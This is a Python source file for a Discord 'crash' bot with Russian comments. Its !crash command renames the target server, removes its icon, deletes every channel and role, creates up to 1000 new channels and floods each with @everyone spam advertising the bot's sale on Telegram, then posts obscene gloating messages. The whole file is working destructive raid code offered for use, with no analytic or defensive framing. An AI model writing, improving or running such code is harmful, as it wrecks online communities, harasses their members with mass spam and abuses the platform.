import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv


# Загружаем переменные из .env файла
load_dotenv()

# Берем токен из переменной окружения
TOKEN = os.getenv('DISCORD_TOKEN')
CHANNEL_NAME = 'crashed by .7ouh'  # Название для новых каналов
CHANNELS_COUNT = 200  # Количество каналов для создания
SPAM_MESSAGE = "@everyone вас отфакал сам <@1004905232284778516>\nкупить бота: https://t.me/crash7ouh"  # Сообщение для спама
SPAM_COUNT_PER_CHANNEL = 50  # Количество спам-сообщений в каждый канал
NEW_SERVER_NAME = "CRaSHEd by .7ouh"  # Новое имя сервера

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    print(f'Бот {bot.user} запущен!')
    print(f'Серверов: {len(bot.guilds)}')
    await bot.change_presence(activity=discord.Game(name="!crash"))


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        try:
            await ctx.send("❌ У вас нет прав для использования этой команды!")
        except:
            print("Не удалось отправить сообщение о недостатке прав")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        print(f"Произошла ошибка: {error}")


@bot.command(name='crash')
@commands.has_permissions(administrator=True)
async def crash_server(ctx, channels_count: int = 200):
    """Главная команда для краша сервера"""

    if channels_count > 1000:
        try:
            await ctx.send("❌ Нельзя создать больше 1000 каналов за раз!")
        except:
            pass
        return

    guild = ctx.guild

    # Создаем временный канал для логов
    try:
        log_channel = await guild.create_text_channel("crash-log")
        await log_channel.send("💥 **CRASH РЕЖИМ АКТИВИРОВАН!**")
        await log_channel.send(
            f"📊 Настройки:\n• Каналов: {channels_count}\n• Сообщений на канал: {SPAM_COUNT_PER_CHANNEL}\n• Новое имя: {NEW_SERVER_NAME}")
    except:
        log_channel = None

    try:
        # 1. МЕНЯЕМ НАЗВАНИЕ СЕРВЕРА
        try:
            await guild.edit(name=NEW_SERVER_NAME)
            if log_channel:
                await log_channel.send(f"✅ Название сервера изменено на: **{NEW_SERVER_NAME}**")
        except Exception as e:
            if log_channel:
                await log_channel.send(f"❌ Ошибка при изменении названия: {e}")

        # 1.5 УДАЛЯЕМ АВАТАРКУ СЕРВЕРА (ВСТАВЬТЕ ЭТОТ КОД СЮДА)
        try:
            # Устанавливаем пустую аватарку (None)
            await guild.edit(icon=None)
            if log_channel:
                await log_channel.send("✅ Аватарка сервера удалена")
        except Exception as e:
            if log_channel:
                await log_channel.send(f"❌ Ошибка при удалении аватарки: {e}")

        # 2. УДАЛЯЕМ ВСЕ КАНАЛЫ параллельно
        if log_channel:
            await log_channel.send("🔄 Удаляю все каналы...")

        delete_tasks = []
        channel_types_count = {
            'text': len(guild.text_channels),
            'voice': len(guild.voice_channels),
            'category': len(guild.categories),
            'stage': len(guild.stage_channels),
            'forum': len(guild.forums)
        }

        for channel in guild.channels:
            if channel != log_channel:
                delete_tasks.append(channel.delete())

        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)

        if log_channel:
            await log_channel.send(
                f"✅ Удалено:\n"
                f"• Текстовых: {channel_types_count['text']}\n"
                f"• Голосовых: {channel_types_count['voice']}\n"
                f"• Категорий: {channel_types_count['category']}\n"
                f"• Трибун: {channel_types_count['stage']}\n"
                f"• Форумов: {channel_types_count['forum']}"
            )

        # 3. УДАЛЯЕМ ВСЕ РОЛИ
        if log_channel:
            await log_channel.send("🔄 Удаляю все роли...")

        # Сохраняем список ролей, которые нельзя удалить
        protected_roles = [guild.default_role]
        if guild.me:
            protected_roles.append(guild.me.top_role)

        # Удаляем все роли
        roles_deleted = 0
        for role in guild.roles:
            if role not in protected_roles and not role.managed and role.name != "@everyone":
                try:
                    await role.delete()
                    roles_deleted += 1
                    await asyncio.sleep(0.1)
                except:
                    pass

        if log_channel:
            await log_channel.send(f"✅ Удалено ролей: {roles_deleted}")
            await log_channel.send(f"📝 Создаю {channels_count} каналов и запускаю спам...")

        # 4. СОЗДАЕМ КАНАЛЫ И ПАРАЛЛЕЛЬНО СПАМИМ
        created_channels = []
        spam_tasks = []

        # Функция для спама в канал
        async def spam_channel(channel):
            spam_count = 0
            for i in range(SPAM_COUNT_PER_CHANNEL):
                try:
                    await channel.send(SPAM_MESSAGE)
                    spam_count += 1
                    await asyncio.sleep(0.1)  # Небольшая задержка между сообщениями
                except Exception as e:
                    print(f"Ошибка спама в {channel.name}: {e}")
                    break
            return spam_count

        # Создаем каналы пачками и сразу спамим
        batch_size = 5  # Размер пачки для параллельного создания и спама

        for i in range(0, channels_count, batch_size):
            create_tasks = []

            # Создаем пачку каналов
            for j in range(batch_size):
                if i + j < channels_count:
                    channel_name = f"{CHANNEL_NAME}-{i + j + 1}"
                    create_tasks.append(guild.create_text_channel(channel_name))

            # Создаем каналы параллельно
            channels_results = await asyncio.gather(*create_tasks, return_exceptions=True)

            # Для каждого созданного канала запускаем спам
            for result in channels_results:
                if not isinstance(result, Exception):
                    created_channels.append(result)
                    # Запускаем спам в этом канале (но не ждем его завершения)
                    asyncio.create_task(spam_channel(result))

            # Обновляем прогресс в лог-канале
            if log_channel and (i + batch_size) % 20 == 0:
                await log_channel.send(f"✅ Создано {min(i + batch_size, channels_count)}/{channels_count} каналов...")

            # Небольшая задержка между пачками
            await asyncio.sleep(0.5)

        # Даем время на спам (все спам-задачи уже запущены параллельно)
        await asyncio.sleep(2)

        # 5. ФИНАЛЬНЫЙ ОТЧЕТ
        if log_channel:
            await log_channel.send(
                f"✅ **ОПЕРАЦИЯ ЗАВЕРШЕНА!**\n• Создано каналов: {len(created_channels)}\n• Спам-сообщений на канал: {SPAM_COUNT_PER_CHANNEL}")

            # Удаляем лог-канал через 5 секунд
            await asyncio.sleep(5)
            try:
                await log_channel.delete()
            except:
                pass

        # Создаем финальный канал с результатом
        try:
            result_channel = await guild.create_text_channel("crash-complete")

            # Создаем эмбед с результатами
            result_embed = discord.Embed(
                title="💥 Я ЗАКОНЧИЛ КОНЧАТЬ НА ВАШ СЕРВЕР",
                color=discord.Color.red()
            )
            result_embed.add_field(name="📊 Статистика",
                                   value=f"• Новое имя сервера: {NEW_SERVER_NAME}\n"
                                         f"• Удалено ролей: {roles_deleted}\n"
                                         f"• Создано каналов: {len(created_channels)}\n"
                                         f"• Сообщений на канал: {SPAM_COUNT_PER_CHANNEL}\n"
                                         f"• Всего спам-сообщений: {len(created_channels) * SPAM_COUNT_PER_CHANNEL}",
                                   inline=False)
            result_embed.set_footer(text="by .7ouh")

            await result_channel.send(embed=result_embed)

            # Финальное сообщение
            await result_channel.send(f"@everyone **СЕРВЕР УСПЕШНО ВЫЕБАН!**")

        except Exception as e:
            print(f"Ошибка при создании финального канала: {e}")

    except Exception as e:
        print(f"Критическая ошибка: {e}")
        try:
            if log_channel:
                await log_channel.send(f"❌ Критическая ошибка: {e}")
            else:
                error_channel = await guild.create_text_channel("critical-error")
                await error_channel.send(f"❌ Ошибка: {e}")
        except:
            pass


# Запуск бота
if __name__ == "__main__":
    bot.run(TOKEN)